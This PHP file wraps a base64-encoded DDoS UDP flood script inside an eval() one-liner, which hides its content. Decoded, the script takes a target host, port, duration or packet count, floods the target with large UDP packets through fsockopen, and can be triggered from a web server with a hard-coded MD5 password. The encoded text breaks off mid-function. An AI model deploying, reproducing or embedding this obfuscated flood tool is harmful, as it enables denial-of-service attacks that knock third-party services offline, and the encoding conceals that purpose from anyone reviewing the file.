<?=eval("?>".base64_decode("PD9waHAgCgovKioKICogU2NyaXB0IHRvIHBlcmZvcm0gYSBERG9TIFVEUCBGbG9vZCBieSBQSFAKICogCiAqCiAqIEBwYWNrYWdlIEREb1MKICogQGxpbmsgaHR0cHM6Ly9naXRodWIuY29tL2RyZWdvODUvRERvUy1QSFAtU2NyaXB0IFRoZSBERG9TIFVEUCBmbG9vZCBHaXRIdWIgcHJvamVjdAogKiBAYXV0aG9yIEFuZHJlYSBEcmFnaGV0dGkgKG9yaWdpbmFsIGZvdW5kZXIpIAogKiBAYXV0aG9yIFRoZVplcjAKICogQGF1dGhvciBTbWF1cnkKICogQGF1dGhvciBtb3R5NjYgIAogKiBAYXV0aG9yIEF4aXNzWHMKICogQGxpY2Vuc2UgaHR0cDovL3d3dy5nbnUub3JnL2xpY2Vuc2VzL29sZC1saWNlbnNlcy9ncGwtMi4wLnR4dCBHUEx2MiAKICogCiAqIFRoaXMgdG9vbCBpcyB3cml0dGVuIG9uIGVkdWNhdGlvbmFsIHB1cnBvc2UsIHBsZWFzZSB1c2UgaXQgb24geW91ciBvd24gZ29vZCBmYWl0aC4KICoKICogVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vcgogKiBtb2RpZnkgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQogKiBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMgogKiBvZiB0aGUgTGljZW5zZSwgb3IgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KICogCiAqIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAogKiBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgogKiBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCiAqIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiAqIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlCiAqIGFsb25nIHdpdGggdGhpcyBwcm9ncmFtOyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlCiAqIEZvdW5kYXRpb24sIEluYy4sIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgIDAyMTEwLTEzMDEsIFVTQS4KICogCiAqIAogKi8KCi8vIEN1cnJlbnQgdmVyc2lvbgpkZWZpbmUoJ0RET1NfVkVSU0lPTicsCQkJCScwLjInICk7CgovLyBNRDUgUGFzc3dvcmQgdG8gYmUgdXNlZCB3aGVuIHRoZSBzY3JpcHQgaXMgZXhlY3V0ZWQgZnJvbSB0aGUgd2Vic2VydmVyLCBkZWZhdWx0IGlzICJhcHBsZSIKZGVmaW5lKCdERE9TX1BBU1NXT1JEJywJCQkJJzFmMzg3MGJlMjc0ZjZjNDliM2UzMWEwYzY3Mjg5NTdmJyApOwoKLy8gU2NyaXB0IG1heCBleGVjdXRpb24gdGltZQpkZWZpbmUoJ0RET1NfTUFYX0VYRUNVVElPTl9USU1FJywwKTsKCi8vIERlZmF1bHQgYW5kIG1heCBwYWNrZXRzIHNpemUKZGVmaW5lKCdERE9TX0RFRkFVTFRfUEFDS0VUX1NJWkUnLAk2NTAwMCApOwpkZWZpbmUoJ0RET1NfTUFYX1BBQ0tFVF9TSVpFJywJCTY1MDAwICk7CgovLyBEZWZhdWx0IGJ5dGUgdG8gc2VuZApkZWZpbmUoJ0RET1NfREVGQVVMVF9CWVRFJywiXHgwMCIpOwoKLy8gTG9nZ2luIGZ1bmN0aW9ucwpkZWZpbmUoJ0RET1NfTE9HX0RFQlVHJywJCQk0ICk7CmRlZmluZSgnRERPU19MT0dfSU5GTycsCQkJCTMgKTsKZGVmaW5lKCdERE9TX0xPR19OT1RJQ0UnLAkJCTIgKTsKZGVmaW5lKCdERE9TX0xPR19XQVJOSU5HJywJCQkxICk7CmRlZmluZSgnRERPU19MT0dfRVJST1InLAkJCTAgKTsKCi8vIE91dHB1dCBmb3JtYXRzIApkZWZpbmUoJ0RET1NfT1VUUFVUX0ZPUk1BVF9KU09OJywJJ2pzb24nICk7CmRlZmluZSgnRERPU19PVVRQVVRfRk9STUFUX1RFWFQnLAkndGV4dCcgKTsKZGVmaW5lKCdERE9TX09VVFBVVF9GT1JNQVRfWE1MJywJJ3htbCcgKTsKCi8vIE91dHB1dCBzdGF0dXMKZGVmaW5lKCdERE9TX09VVFBVVF9TVEFUVVNfRVJST1InLAknZXJyb3InICk7CmRlZmluZSgnRERPU19PVVRQVVRfU1RBVFVTX1NVQ0NFU1MnLCdzdWNjZXNzJyApOwoKCgoKLyoqCiAqIEREb1MgbWFpbiBjbGFzcwogKiAKICogQGF1dGhvciBtb3R5NjYKICogQHNpbmNlIDAuMgogKi8KY2xhc3MgRERvUyB7CgkKCS8qKgoJICogRGVmYXVsdCBwYXJhbWV0ZXJzCgkgKiBAdmFyIGFycmF5CgkgKi8KCXByaXZhdGUgJHBhcmFtcyA9IGFycmF5KAoJCQknaG9zdCcgPT4gCScnLAoJCQkncG9ydCcgPT4gCScnLAoJCQkncGFja2V0JyA9PiAnJywKCQkJJ3RpbWUnCT0+IAknJywKCQkJJ3Bhc3MnCT0+IAknJywKCQkJJ2J5dGVzJyA9PgknJywKCQkJJ3ZlcmJvc2UnPT4gRERPU19MT0dfSU5GTywKCQkJJ2Zvcm1hdCc9PiAndGV4dCcsCgkJCSdvdXRwdXQnPT4gJycsCgkJCSdpbnRlcnZhbCc9PicxJwoJKTsKCQoJCgkvKioKCSAqIExvZyBsYWJlbHMKCSAqIEB2YXIgYXJyYXkKCSAqLwoJcHJpdmF0ZSAkbG9nX2xhYmVscyA9IGFycmF5KAoJCQlERE9TX0xPR19ERUJVRyA9PiAnZGVidWcnLAoJCQlERE9TX0xPR19JTkZPID0+ICdpbmZvJywKCQkJRERPU19MT0dfTk9USUNFID0+ICdub3RpY2UnLAoJCQlERE9TX0xPR19XQVJOSU5HID0+ICd3YXJuaW5nJywKCQkJRERPU19MT0dfRVJST1IgPT4gJ2Vycm9yJwoJKTsKCQoJCgkvKioKCSAqIENvbnRlbnQgdHlwZSB0byBzZW50IGluIGhlYWRlcgoJICogQHZhciBzdHJpbmcKCSAqLwoJcHJpdmF0ZSAkY29udGVudF90eXBlID0gIiI7CgkKCQoJLyoqCgkgKiBPdXRwdXQgYnVmZmVyLCB3aWxsIGJlIHByaW50ZWQgbGF0ZXIgaW4gdGV4dCxqc29uIG9yIHhtbCBmb3JtYXQKCSAqIEB2YXIgYXJyYXkKCSAqLwoJcHJpdmF0ZSAkb3V0cHV0ID0gYXJyYXkoKTsKCQoJCgkvKioKCSAqIEluaXRpYWxpemVyCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcGFyYW1zID0gYXJyYXkoKSkgewoJCQoJCW9iX3N0YXJ0KCk7CgkJCgkJaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJyxERE9TX01BWF9FWEVDVVRJT05fVElNRSk7CgkJCgkJJHRoaXMtPnNldF9wYXJhbXMoJHBhcmFtcyk7CgkJCgkJJHRoaXMtPnNldF9jb250ZW50X3R5cGUoKTsKCQkKCQkkdGhpcy0+c2lnbmF0dXJlKCk7CgoJCWlmKGlzc2V0KCR0aGlzLT5wYXJhbXNbJ2hlbHAnXSkpIHsKCQkJJHRoaXMtPnVzYWdlKCk7CgkJCWV4aXQ7CgkJfQoJCQoJCSR0aGlzLT52YWxpZGF0ZV9wYXJhbXMoKTsKCgkJCgkJJHRoaXMtPmF0dGFjaygpOwoJCQoJCSR0aGlzLT5wcmludF9vdXRwdXQoKTsKCQkKCQlvYl9lbmRfZmx1c2goKTsKCX0KCQoJCgkvKioKCSAqIFByaW50cyB0aGUgc2NyaXB0IG5hbWUgYW5kIHZlcnNpb24gbnVtYmVyCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzaWduYXR1cmUoKSB7CgkJaWYoRERPU19PVVRQVVRfRk9STUFUX1RFWFQgPT0gJHRoaXMtPmdldF9wYXJhbSgnZm9ybWF0JykpIHsKCQkJJHRoaXMtPnByaW50bG4oJ0REb1MgVURQIEZsb29kIHNjcmlwdCcpOwoJCQkkdGhpcy0+cHJpbnRsbigndmVyc2lvbiAnLkRET1NfVkVSU0lPTik7CgkJCSR0aGlzLT5wcmludGxuKCk7CgkJfQoJfQoJCgkKCS8qKgoJICogUHJpbnRzIHRoZSBzY3JpcHQgdXNhZ2UKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHVzYWdlKCkgewoJCSR0aGlzLT5wcmludGxuKCJFWEFNUExFUzoiKTsKCQkkdGhpcy0+cHJpbnRsbigiZnJvbSB0ZXJtaW5hbDogIHBocCAuLyIuYmFzZW5hbWUoX19GSUxFX18pLiIgaG9zdD1UQVJHRVQgcG9ydD1QT1JUIHRpbWU9U0VDT05EUyBwYWNrZXQ9TlVNQkVSIGJ5dGVzPU5VTUJFUiIpOwoJCSR0aGlzLT5wcmludGxuKCJmcm9tIHdlYnNlcnZlcjogaHR0cDovL2xvY2FsaG9zdC9kZG9zLnBocD9wYXNzPVBBU1NXT1JEJmhvc3Q9VEFSR0VUJnBvcnQ9UE9SVCZ0aW1lPVNFQ09ORFMmcGFja2V0PU5VTUJFUiZieXRlcz1OVU1CRVIiKTsKCQkkdGhpcy0+cHJpbnRsbigpOwoJCSR0aGlzLT5wcmludGxuKCJQQVJBTUVURVJTOiIpOwoJCSR0aGlzLT5wcmludGxuKCJoZWxwCVByaW50IHRoaXMgaGVscCBzdW1tYXJ5IHBhZ2UiKTsKCQkkdGhpcy0+cHJpbnRsbigiaG9zdAlSRVFVSVJFRCBzcGVjaWZ5IElQIG9yIEhPU1ROQU1FIik7CgkJJHRoaXMtPnByaW50bG4oInBhc3MJUkVRVUlSRUQgb25seSBpZiB1c2VkIGZyb20gd2Vic2VydmVyIik7CgkJJHRoaXMtPnByaW50bG4oInBvcnQJT1BUSU9OQUwgaWYgbm90IHNwZWNpZmllZCBhIHJhbmRvbSBwb3J0cyB3aWxsIGJlIHNlbGVjdGVkIik7CgkJJHRoaXMtPnByaW50bG4oInRpbWUJT1BUSU9OQUwgc2Vjb25kcyB0byBrZWVwIHRoZSBERG9TIGFsaXZlLCByZXF1aXJlZCBpZiBwYWNrZXQgaXMgbm90IHVzZWQiKTsKCQkkdGhpcy0+cHJpbnRsbigicGFja2V0CU9QVElPTkFMIG51bWJlciBvZiBwYWNrZXRzIHRvIHNlbmQgdG8gdGhlIHRhcmdldCwgcmVxdWlyZWQgaWYgdGltZSBpcyBub3QgdXNlZCIpOwoJCSR0aGlzLT5wcmludGxuKCJieXRlcwlPUFRJT05BTCBzaXplIG9mIHRoZSBwYWNrZXQgdG8gc2VuZCwgZGVmdWFsdDogIi5ERE9TX0RFRkFVTFRfUEFDS0VUX1NJWkUpOwoJCSR0aGlzLT5wcmludGxuKCJmb3JtYXQJT1BUSU9OQUwgb3V0cHV0IGZvcm1hdCwgKHRleHQsanNvbix4bWwpLCBkZWZhdWx0OiB0ZXh0Iik7CgkJJHRoaXMtPnByaW50bG4oIm91dHB1dAlPUFRJT05BTCBsb2dmaWxlLCBzYXZlIHRoZSBvdXRwdXQgdG8gZmlsZSIpOwoJCSR0aGlzLT5wcmludGxuKCJ2ZXJib3NlCU9QVElPTkFMIDA6IGRlYnVnLCAxOmluZm8sIDI6bm90aWNlLCAzOndhcm5pbmcsIDQ6ZXJyb3IsIGRlZmF1bHQ6IGluZm8iKTsKCQkkdGhpcy0+cHJpbnRsbigpOwoJCSR0aGlzLT5wcmludGxuKCJOb3RlOiAJSWYgYm90aCB0aW1lIGFuZCBwYWNrZXQgYXJlIHNwZWNpZmllZCwgb25seSB0aW1lIHdpbGwgYmUgdXNlZCIpOwoJCSR0aGlzLT5wcmludGxuKCk7CgkJJHRoaXMtPnByaW50bG4oIk1vcmUgaW5mb3JtYXRpb24gb24gaHR0cHM6Ly9naXRodWIuY29tL2RyZWdvODUvRERvUy1QSFAtU2NyaXB0Iik7CgkJJHRoaXMtPnByaW50bG4oKTsKCX0KCQoJCgkvKioKCSAqIFN0YXJ0IHRoZSBVRFAgZmxvb2QgYXR0YWNrCgkgKiBUT0RPIFJld3JpdGUgdGhlIGF0dGFjayBjb2RlLCBuZWVkIHRvIHJlbW92ZSB0aGUgZG91YmxlIGxvb3AgYW5kIHRvIGZpbmQgYSBzeXN0ZW0gdG8KCSAqIAkJcHJpbnQgb3V0IGEgcHJvZ3Jlc3MgYmFyIHdoZW4gd2UgYXJlIGluIHRleHQgbW9kZQoJICovCglwcml2YXRlIGZ1bmN0aW9uIGF0dGFjaygpewoJCQoJCSRwYWNrZXRzID0gMDsKCQkkbWVzc2FnZSA9IHN0cl9yZXBlYXQoRERPU19ERUZBVUxUX0JZVEUsICR0aGlzLT5nZXRfcGFyYW0oJ2J5dGVzJykpOwoJCQoJCSR0aGlzLT5sb2coJ0REb3MgVURQIGZsb29kIHN0YXJ0ZWQnKTsKCQkKCQkvLyBUaW1lIGJhc2VkIGF0dGFjawoJCWlmKCR0aGlzLT5nZXRfcGFyYW0oJ3RpbWUnKSkgewoJCQkKCQkJJGV4ZWNfdGltZSA9ICR0aGlzLT5nZXRfcGFyYW0oJ3RpbWUnKTsKCQkJJG1heF90aW1lID0gdGltZSgpICsgJGV4ZWNfdGltZTsKCQkKCQkJd2hpbGUodGltZSgpIDwgJG1heF90aW1lKXsKCQkJCSRwYWNrZXRzKys7CgkJCQkkdGhpcy0+bG9nKCdTZW5kaW5nIHBhY2tldCAjJy4kcGFja2V0cyxERE9TX0xPR19ERUJVRyk7CgkJCQkkdGhpcy0+dWRwX2Nvbm5lY3QoJHRoaXMtPmdldF9wYXJhbSgnaG9zdCcpLCR0aGlzLT5nZXRfcGFyYW0oJ3BvcnQnKSwkbWVzc2FnZSk7CgkJCQl1c2xlZXAoJHRoaXMtPmdldF9wYXJhbSgnaW50ZXJ2YWwnKSAqIDEwMCk7CgkJCX0KCQkJJHRpbWVTdHIgPSAkZXhlY190aW1lLiAnIHNlY29uZCc7CgkJCWlmKDEgIT0gJGV4ZWNfdGltZSkgewoJCQkJJHRpbWVTdHIgLj0gJ3MnOwoJCQl9CgkJfQoJCS8vIFBhY2tldCBudW1iZXIgYmFzZWQgYXR0YWNrCgkJZWxzZSB7CgkJCSRtYXhfcGFja2V0ID0gJHRoaXMtPmdldF9wYXJhbSgncGFja2V0Jyk7CgkJCSRzdGFydF90aW1lPXRpbWUoKTsKCQkKCQkJd2hpbGUoJHBhY2tldHMgPCAkbWF4X3BhY2tldCl7CgkJCQkkcGFja2V0cysrOwoJCQkJJHRoaXMtPmxvZygnU2VuZGluZyBwYWNrZXQgIycuJHBhY2tldHMsRERPU19MT0dfREVCVUcpOwoJCQkJJHRoaXMtPnVkcF9jb25uZWN0KCR0aGlzLT5nZXRfcGFyYW0oJ2hvc3QnKSwkdGhpcy0+Z2V0X3BhcmFtKCdwb3J0JyksJG1lc3NhZ2UpOwoJCQkJdXNsZWVwKCR0aGlzLT5nZXRfcGFyYW0oJ2ludGVydmFsJykgKiAxMDApOwoJCQl9CgkJCSRleGVjX3RpbWUgPSB0aW1lKCkgLSAkc3RhcnRfdGltZTsKCQkKCQkJLy8gSWYgdGhlIHNjcmlwdCBlbmQgYmVmb3JlIDEgc2VjLCBhbGwgdGhlIHBhY2tldHMgd2VyZSBzZW50IGluIDEgc2VjCgkJCWlmKCRleGVjX3RpbWUgPD0gMSl7CgkJCQkkZXhlY190aW1lPTE7CgkJCQkkdGltZVN0ciA9ICdhYm91dCBhIHNlY29uZCc7CgkJCX0KCQkJZWxzZSB7CgkJCQkkdGltZVN0ciA9ICdhYm91dCAnIC4gJGV4ZWNfdGltZSAuICcgc2Vjb25kcyc7CgkJCX0KCQl9CgkJCgkJJHRoaXMtPmxvZygiRERvUyBVRFAgZmxvb2QgY29tcGxldGVkIik7CgkJCgkJJGRhdGEgPSAkdGhpcy0+cGFyYW1zOwoJCQoJCS8vIFdlIGRvbid0IG5lZWQgdG8gc2VuZCBwYXNzLCBwYWNrZXRzIGFuZCB0aW1lIGFzIGRhdGEgZm9yIGpzb24gYW5kIHhtbCwgYXMgd2UgYXJlIHNlbmRpbmcgdGhlIHRvdGFsCgkJdW5zZXQoJGRhdGFbJ3Bhc3MnXSk7CgkJdW5zZXQoJGRhdGFbJ3BhY2tldCddKTsKCQl1bnNldCgkZGF0YVsndGltZSddKTsKCQkKCQkkZGF0YVsncG9ydCddID0gMCA9PSAkZGF0YVsncG9ydCddID8gJ1JhZG9tIHBvcnRzJyA6ICRkYXRhWydwb3J0J107CgkJJGRhdGFbJ3RvdGFsX3BhY2tldHMnXSA9ICRwYWNrZXRzOwoJCSRkYXRhWyd0b3RhbF9zaXplJ10gPSAkdGhpcy0+Zm9ybWF0X2J5dGVzKCRwYWNrZXRzKiRkYXRhWydieXRlcyddKTsKCQkkZGF0YVsnZHVyYXRpb24nXSA9ICR0aW1lU3RyOwoJCSRkYXRhWydhdmVyYWdlJ10gPSByb3VuZCgkcGFja2V0cy8kZXhlY190aW1lLCAyKTsKCQkKCQkkdGhpcy0+c2V0X291dHB1dCgnVURQIGZsb29kIGNvbXBsZXRlZCcsIERET1NfT1VUUFVUX1NUQVRVU19TVUNDRVNTLCRkYXRhKTsKCQkKCQkkdGhpcy0+cHJpbnRfb3V0cHV0KCk7CgkJCgkJZXhpdDsKCX0KCQoJCgoJLyoqCgkgKiBVRFAgQ29ubmVjdAoJICogQHBhcmFtIHN0cmluZyAJJGggSG9zdCBuYW1lIG9yIGlwIGFkZHJlc3MKCSAqIEBwYXJhbSBpbnRlZ2VyIAkkcCBQb3J0IG51bWJlciwgaWYgdGhlIHBvcnQgaXMgMCB0aGVuIGEgcmFuZG9tIHBvcnQgd2lsbCBiZSB1c2VkCgkgKiBAcGFyYW0gc3RyaW5nIAkkb3V0IERhdGEgdG8gc2VuZAoJICogQHJldHVybiBib29sZWFuCVRydWUgaWYgdGhlIHBhY2tldCB3YXMgc2VudAoJICovCglwcml2YXRlIGZ1bmN0aW9uIHVkcF9jb25uZWN0KCRoLCRwLCRvdXQpewoJCQoJCWlmKDAgPT0gJHApIHsKCQkJJHAgPSByYW5kKDEscmFuZCgxLDY1NTM1KSk7CgkJfQoKCQkkdGhpcy0+bG9nKCJUcnlpbmcgdG8gb3BlbiBzb2NrZXQgdWRwOi8vJGg6JHAiLERET1NfTE9HX0RFQlVHKTsKCQkkZnAgPSBAZnNvY2tvcGVuKCd1ZHA6Ly8nLiRoLCAkcCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7CgkKCQlpZighJGZwKSB7CgkJCSR0aGlzLT5sb2coIlVEUCBzb2NrZXQgZXJyb3I6ICRlcnJzdHIgKCRlcnJubykiLERET1NfTE9HX0RFQlVHKTsKCQkJJHJldCA9IGZhbHNlOwoJCX0KCQllbHNlIHsKCQkJJHRoaXMtPmxvZygiU29ja2V0IG9wZW5lZCB3aXRoICRoIG9uIHBvcnQgJHAiLERET1NfTE9HX0RFQlVHKTsKCQkJaWYoIUBmd3JpdGUoJGZwLCAkb3V0KSkgewoJCQkJJHRoaXMtPmxvZygiRXJyb3IgZHVyaW5nIHNlbmRpbmcgZGF0YSIsRERPU19MT0dfRVJST1IpOwoJCQl9CgkJCWVsc2UgewoJCQkJJHRoaXMtPmxvZygiRGF0YSBzZW50IHN1Y2Nlc3NmdWxseSIsRERPU19MT0dfREVCVUcpOwoJCQl9CgkJCUBmY2xvc2UoJGZwKTsKCQkJJHJldCA9IHRydWU7CgkJCSR0aGlzLT5sb2coIkNsb3Npbmcgc29ja2V0IHVkcDovLyRoOiRwIixERE9TX0xPR19ERUJVRyk7CgkJfQoJCgkJcmV0dXJuICRyZXQ7Cgl9CgkKCQoJCgkvKioKCSAqIFBhcnNlIHBhcmFtZXRlcnMgZnJvbSBhcmd2LCBwb3N0IG9yIGdldAoJICogQHRvZG8gUmVtb3ZlIHNldHRpbmcgcGFyYW1zIGZyb20gdGhpcyBtZXRob2QsIGxldCBkbyBpdCBvdXRzaWRlIHRoZSBjbGFzcwoJICovCglwcml2YXRlIGZ1bmN0aW9uIHNldF9wYXJhbXMoJHBhcmFtcyA9IGFycmF5KCkpIHsKCQkKCQkkb3JpZ2luYWxfcGFyYW1zID0gYXJyYXlfa2V5cygkdGhpcy0+cGFyYW1zKTsKCQkkb3JpZ2luYWxfcGFyYW1zW10gPSAnaGVscCc7CgkJCgkJZm9yZWFjaCgkcGFyYW1zIGFzICRrZXkgPT4gJHZhbHVlKSB7CgkJCWlmKCFpbl9hcnJheSgka2V5LCAkb3JpZ2luYWxfcGFyYW1zKSkgewoJCQkJJHRoaXMtPnNldF9vdXRwdXQoIlVua25vd24gcGFyYW0gJGtleSIsIERET1NfT1VUUFVUX1NUQVRVU19FUlJPUik7CgkJCQkkdGhpcy0+cHJpbnRfb3V0cHV0KCk7CgkJCQlleGl0KDEpOwoJCQl9CgkJCSR0aGlzLT5zZXRfcGFyYW0oJGtleSwgJHZhbHVlKTsKCQl9Cgl9CgkKCS8qKgoJICogVmFsaWRhdGUgYW5kIHNhbnRpemUgdGhlIHBhcmFtZXRlcnMKCSAqLwoJcHJpdmF0ZSBmdW5jdGlvbiB2YWxpZGF0ZV9wYXJhbXMoKSB7CgkJCgkJLy8gUGFzc3dvcmQgZm9yIHdlYiB1c2VycwoJCWlmKCEkdGhpcy0+aXNfY2xpKCkgJiYgbWQ1KCR0aGlzLT5nZXRfcGFyYW0oJ3Bhc3MnKSkgIT09IERET1NfUEFTU1dPUkQpIHsKCQkJJHRoaXMtPnNldF9vdXRwdXQoIldyb25nIHBhc3N3b3JkIiwgRERPU19PVVRQVVRfU1RBVFVTX0VSUk9SKTsKCQkJJHRoaXMtPnByaW50X291dHB1dCgpOwoJCQlleGl0KDEpOwoJCX0KCQllbHNlaWYoISR0aGlzLT5pc19jbGkoKSkgewoJCQkkdGhpcy0+bG9nKCdQYXNzd29yZCBhY2NlcHRlZCcpOwoJCX0KCQkKCQlpZighJHRoaXMtPmlzX3ZhbGlkX3RhcmdldCgkdGhpcy0+Z2V0X3BhcmFtKCdob3N0JykpKSB7CgkJCSR0aGlzLT5zZXRfb3V0cHV0KCJJbnZhbGlkIGhvc3QiLCBERE9TX09VVFBVVF9TVEFUVVNfRVJST1IpOwoJCQkkdGhpcy0+cHJpbnRfb3V0cHV0KCk7CgkJCWV4aXQoMSk7CgkJfQoJCWVsc2UgewoJCQkkdGhpcy0+bG9nKCJTZXR0aW5nIGhvc3QgdG8gIiAuICR0aGlzLT5nZXRfcGFyYW0oJ2hvc3QnKSk7CgkJfQoJCWlmKCIiICE9ICR0aGlzLT5nZXRfcGFyYW0oJ3BvcnQnKSAmJiAhJHRoaXMtPmlzX3ZhbGlkX3BvcnQoJHRoaXMtPmdldF9wYXJhbSgncG9ydCcpKSkgewoJCQkkdGhpcy0+bG9nKCJJbnZhbGlkIHBvcnQiLCBERE9TX0xPR19XQVJOSU5HKTsKCQkJJHRoaXMtPmxvZygiU2V0dGluZyBwb3J0IHRvIHJhbmRvbSIsRERPU19MT0dfTk9USUNFKTsKCQkJJHRoaXMtPnNldF9wYXJhbSgncG9ydCcsIDApOwoJCX0KCQllbHNlIHsKCQkJJHRoaXMtPmxvZygiU2V0dGluZyBwb3J0IHRvICIuJHRoaXMtPmdldF9wYXJhbSgncG9ydCcpKTsKCQl9CgkJCgkJaWYoaXNfbnVtZXJpYygkdGhpcy0+Z2V0X3BhcmFtKCdieXRlcycpKSAmJiAwIDwgJHRoaXMtPmdldF9wYXJhbSgnYnl0ZXMnKSkgewoJCQlpZihERE9TX01BWF9QQUNLRVRfU0laRSA8ICR0aGlzLT5nZXRfcGFyYW0oJ2J5dGVzJykpIHsKCQkJCSR0aGlzLT5sb2coIlBhY2tldCBzaXplIGV4Y2VlZHMgdGhlIG1heCBzaXplIiwgRERPU19MT0dfV0FSTklORyk7CgkJCX0KCQkJJHRoaXMtPnNldF9wYXJhbSgnYnl0ZXMnLG1pbigkdGhpcy0+Z2V0X3BhcmFtKCdieXRlcycpLERET1NfTUFYX1BBQ0tFVF9TSVpFKSk7CgkJCSR0aGlzLT5sb2coIlNldHRpbmcgcGFja2V0IHNpemUgdG8gIi4gJHRoaXMtPmZvcm1hdF9ieXRlcygkdGhpcy0+Z2V0X3BhcmFtKCdieXRlcycpKSk7CgkJfQoJCWVsc2UgewoJCQkkdGhpcy0+bG9nKCJTZXR0aW5nIHBhY2tldCBzaXplIHRvICIuJHRoaXMtPmZvcm1hdF9ieXRlcyhERE9TX0RFRkFVTFRfUEFDS0VUX1NJWkUpLERET1NfTE9HX05PVElDRSk7CgkJCSR0aGlzLT5zZXRfcGFyYW0oJ2J5dGVzJyxERE9TX0RFRkFVTFRfUEFDS0VUX1NJWkUpOwoJCX0KCQkKCQlpZighaXNfbnVtZXJpYygkdGhpcy0+Z2V0X3BhcmFtKCd0aW1lJykpICYmICFpc19udW1lcmljKCR0aGlzLT5nZXRfcGFyYW0oJ3BhY2tldCcpKSkgewoJCQkkdGhpcy0+c2V0X291dHB1dCgiTWlzc2luZyBwYXJhbWV0ZXIgdGltZSBvciBwYWNrZXQiLCBERE9TX09VVFBVVF9TVEFUVVNfRVJST1IpOwoJCQkkdGhpcy0+cHJpbnRfb3V0cHV0KCk7CgkJCWV4aXQoMSk7CgkJfQoJCWVsc2UgewoJCQkvLyBKdXN0IHRvIGJlIHN1cmUgdGhhdCB1c2VycyBkb2VzIG5vdCBzdWJtaXQgYSB3cm9uZyB0aW1lICJleGFtcGxlOiBhLC0xIiBhbmQgY29ycmVjdCBwYWNrZXQKCQkJJHRoaXMtPnNldF9wYXJhbSgndGltZScsIGFicyhpbnR2YWwoJHRoaXMtPmdldF9wYXJhbSgndGltZScpKSkpOwoJCQkkdGhpcy0+c2V0X3BhcmFtKCdwYWNrZXQnLCBhYnMoaW50dmFsKCR0aGlzLT5nZXRfcGFyYW0oJ3BhY2tldCcpKSkpOwoJCX0KCQkKCQlpZignJyAhPSAkdGhpcy0+Z2V0X3BhcmFtKCdvdXRwdXQnKSkgewoJCQkkdGhpcy0+bG9nKCJTZXR0aW5nIGxvZyBmaWxlIHRvICIgLiR0aGlzLT5nZXRfcGFyYW0oJ291dHB1dCcpLERET1NfTE9HX0lORk8pOwoJCX0KCQkKCX0KCQoJCgkvKioKCSAqIFJldHVybnMgYSBwYXJhbQoJICogQHBhcmFtIAlzdHJpbmcgCSRwYXJhbSBuYW1lIG9mIHRoZSBwYXJhbWV0ZXIKCSAqIEByZXR1cm4gCXN0cmluZ3xudWxsCVZhbHVlIG9mIHRoZSBwYXJhbWV0ZXIgb3IgbnVsbCBpZiBub3QgZXhzaXN0CgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRfcGFyYW0oJHBhcmFtKSB7CgkJcmV0dXJuIGlzc2V0KCR0aGlzLT5wYXJhbXNbJHBhcmFtXSkgPyAkdGhpcy0+cGFyYW1zWyRwYXJhbV0gOiBudWxsOwoJfQoJCgkvKioKCSAqIEFkZCBhIHBhcmFtZXRlciAKCSAqIEBwYXJhbSBzdHJpbmcgCSRwYXJhbQoJICogQHBhcmFtIG1peGVkIAkkdmFsdWUKCSAqLwoJcHJpdmF0ZSBmdW5jdGlvbiBzZXRfcGFyYW0oJHBhcmFtLCR2YWx1ZSkgewoJCQoJCSR0aGlzLT5wYXJhbXNbJHBhcmFtXSA9ICR2YWx1ZTsKCX0KCQoJLyoqCgkgKiBTZXQgdGhlIGNvbnRlbnQgdHlwZSBmb3IgZWFjaCBvdXRwdXQgZm9ybWF0CgkgKi8KCXByaXZhdGUgZnVuY3Rpb24gc2V0X2NvbnRlbnRfdHlwZSgpIHsKCQkKCQkvLyBTZXQgdGhlIGNvbnRlbnQgdHlwZSBoZWFkZXJzIG9ubHkgZm9yIHdlYgoJCWlmKCR0aGlzLT5pc19jbGkoKSkgewoJCQlyZXR1cm47CgkJfQoJCQoJCXN3aXRjaCgkdGhpcy0+Z2V0X3BhcmFtKCdvdXRwdXQnKSkgewoJCQljYXNlIERET1NfT1VUUFVUX0ZPUk1BVF9KU09OIDogewoJCQkJJHRoaXMtPmNvbnRlbnRfdHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04OyI7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIERET1NfT1VUUFVUX0ZPUk1BVF9YTUwgOiB7CgkJCQkkdGhpcy0+Y29udGVudF90eXBlID0gImFwcGxpY2F0aW9uL3htbDsgY2hhcnNldD11dGYtODsiOwoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdCA6IHsKCQkJCSR0aGlzLT5jb250ZW50X3R5cGUgPSAidGV4dC9wbGFpbjsgY2hhcnNldD11dGYtODsiOwogCQkJCWJyZWFrOwoJCQl9CgkJfQoJCQoJCWhlYWRlcigiQ29udGVudC1UeXBlOiAiLiAkdGhpcy0+Y29udGVudF90eXBlKTsKCQkkdGhp